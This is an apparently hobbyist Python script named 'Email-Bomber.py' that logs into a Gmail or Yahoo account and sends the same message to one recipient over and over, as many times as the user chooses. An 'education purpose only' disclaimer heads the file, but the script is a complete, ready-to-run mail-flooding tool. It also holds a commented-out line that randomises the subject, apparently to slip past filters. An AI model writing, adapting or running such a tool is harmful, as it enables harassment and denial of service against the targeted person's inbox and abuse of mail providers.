#!/usr/bin/python
#Email-Bomber.py by aTAR!
#This code for education purpose only.
#Use it at your own risk !

import os
import smtplib
import getpass
import sys


server = input ('Server Mail: ')
user = input('Username: ')
passwd = input('Password: ')
#passwd = getpass.getpass(prompt= 'Password: ') 
#This one above makes the password invisible while you type it :)

to = input('\nTo: ')
subject = input('Subject: ') 
body = input('Message: ')
total = int(input('Number of send: '))
total=total+1
if server == 'gmail':
    smtp_server = 'smtp.gmail.com'
    port = 587
elif server == 'yahoo':
    smtp_server = 'smtp.mail.yahoo.com'
    port = 25
else:
    print('Applies only to gmail and yahoo.')
    sys.exit()

print('')

try:
    server = smtplib.SMTP(smtp_server,port) 
    server.ehlo()
    if smtp_server == "smtp.gmail.com":
            server.starttls()
    server.login(user,passwd)
    for i in range(1, total):
        #subject = os.urandom(9)
        msg = "\r\n".join([
  "From: " + user,
  "To: " + to,
  "Subject: "+ subject,
  "",
  body,
  ])
        server.sendmail(user,to,msg)
        print ("\rTotal emails sent: %i" % i)
        sys.stdout.flush()
    server.quit()
    print('\n Done !')
except KeyboardInterrupt:
    print('[-] Canceled')
    sys.exit()
except smtplib.SMTPAuthenticationError:
    print('\n[!] The username or password you entered is incorrect.')
    sys.exit()
